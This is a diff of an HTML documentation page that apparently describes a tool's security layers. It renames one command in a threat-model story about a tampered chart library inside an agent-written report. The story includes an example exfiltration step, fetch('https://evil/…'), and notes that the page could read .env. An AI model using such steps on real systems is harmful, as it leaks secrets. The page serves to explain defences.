@@ -280,7 +280,7 @@
   <div class="story">
     <h3>The poisoned report</h3>
     <ol>
-      <li>An agent writes <code>report.html</code> in your repo root and runs <code>tie open report.html</code>. The chart library it bundled was tampered upstream.</li>
+      <li>An agent writes <code>report.html</code> in your repo root and runs <code>tie add report.html</code>. The chart library it bundled was tampered upstream.</li>
       <li>The tile opens. <span class="stop">Html is static:</span> the CSP lets only Tie's bootstrap run. The library is inert markup; the tile shows "Scripts blocked". End of story.</li>
       <li>What follows is the counterfactual: what the layers would do if a renderer bug ever gave that page script in its own process. It fetches <code>.env</code>: <span class="leak">allowed</span>, same root.</li>
       <li>It tries <code>fetch('https://evil/…')</code>. <span class="stop">CSP refuses; the session's proxy would refuse anyway.</span> WebRTC: <span class="stop">no UDP.</span></li>
